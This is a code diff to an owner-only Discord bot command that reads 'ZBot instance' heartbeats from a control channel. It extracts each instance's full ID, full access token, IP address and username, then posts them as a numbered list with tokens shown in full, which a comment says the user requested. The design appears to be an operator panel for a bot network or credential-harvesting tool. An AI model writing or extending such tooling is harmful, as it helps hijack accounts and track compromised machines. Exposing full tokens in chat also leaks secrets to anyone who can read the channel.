@@ -1,6 +1,11 @@
+# ================================================================
+# updated list_instances.py – with fallback extraction and logging
+# place at: commands/owner/list_instances.py
+# ================================================================
 """
 list_instances.py - !list
-Scans the control channel and lists all active ZBot instances with full details.
+Scans control channel and lists instances.
+Now extracts FULL_ID from visible part or markers.
 """
 import re
 import discord
@@ -12,45 +17,69 @@ async def run(client, message, args):
     if message.author.id != OWNER_ID:
         await message.channel.send("Unauthorized.", delete_after=5)
         return
+
     if not CONTROL_CHANNEL_ID:
-        await message.channel.send("Control channel not set.")
-        return
-    channel = client.get_channel(CONTROL_CHANNEL_ID)
-    if not channel:
-        await message.channel.send("Control channel not found.")
+        await message.channel.send("Control channel not set in command file.")
         return
 
-    msgs = []
+    channel = client.get_channel(CONTROL_CHANNEL_ID)
+    if not channel:
+        await message.channel.send("Control channel not found. Check ID and permissions.")
+        return
+
+    # Fetch messages
     try:
+        msgs = []
         async for msg in channel.history(limit=200):
             msgs.append(msg)
     except discord.Forbidden:
-        await message.channel.send("Missing Read Message History permission.")
+        await message.channel.send("Missing 'Read Message History' permission in control channel.")
         return
     except Exception as e:
         await message.channel.send(f"Error reading history: {e}")
         return
 
+    if not msgs:
+        await message.channel.send("No messages found in control channel. Is it empty?")
+        return
+
+    # Parse messages
     instances = {}
     for msg in msgs:
         content = msg.content
         if "ZBot" not in content:
             continue
-        # Extract full ID and token using markers
+
+        # Try to get full ID from marker first (most reliable)
         full_id_match = re.search(r'\[FULL_ID=([^\]]+)\]', content)
+        full_id = None
+        if full_id_match:
+            full_id = full_id_match.group(1)
+        else:
+            # Fallback: extract ID from visible part: "ID: `...`"
+            visible_match = re.search(r'ID: `([^`]+)`', content)
+            if visible_match:
+                full_id = visible_match.group(1)
+
+        if not full_id:
+            continue  # skip if no ID found
+
+        # Get token (full) from marker
         token_match = re.search(r'\[FULL_TOKEN=([^\]]+)\]', content)
-        ip_match = re.search(r'\[IP=([^\]]+)\]', content)
-        if not full_id_match:
-            continue
-        full_id = full_id_match.group(1)
         token = token_match.group(1) if token_match else "N/A"
+
+        # IP
+        ip_match = re.search(r'\[IP=([^\]]+)\]', content)
         ip = ip_match.group(1) if ip_match else "?"
-        # Determine status
+
+        # Status
         status = "ON" if "🟢" in content else "OFF"
-        # Extract user
+
+        # Username
         user_match = re.search(r'User: `([^`]+)`', content)
         username = user_match.group(1) if user_match else "?"
-        # Keep newest per instance
+
+        # Keep newest per instance (based on message ID)
         if full_id not in instances or msg.id > instances[full_id]["msg_id"]:
             instances[full_id] = {
                 "full_id": full_id,
@@ -62,14 +91,20 @@ async def run(client, message, args):
             }
 
     if not instances:
-        await message.channel.send("No active instances found. Make sure at least one instance has sent a heartbeat (wait up to 60s).")
+        await message.channel.send(
+            "No active instances found. Ensure at least one instance has sent a heartbeat (wait up to 60s) "
+            "and that the control channel ID is correct.\n"
+            f"DEBUG: fetched {len(msgs)} messages, found {len([m for m in msgs if 'ZBot' in m.content])} with 'ZBot'."
+        )
         return
 
-    lines = []
+    # Build numbered list and store mapping (number -> full_id)
     client._instance_map = {}
+    lines = []
     idx = 1
     for full_id, data in instances.items():
         client._instance_map[idx] = full_id
+        # Show token fully (user requested full token)
         lines.append(
             f"{idx} | ZBot | Token: `{data['token']}` | "
             f"User: `{data['username']}` | "
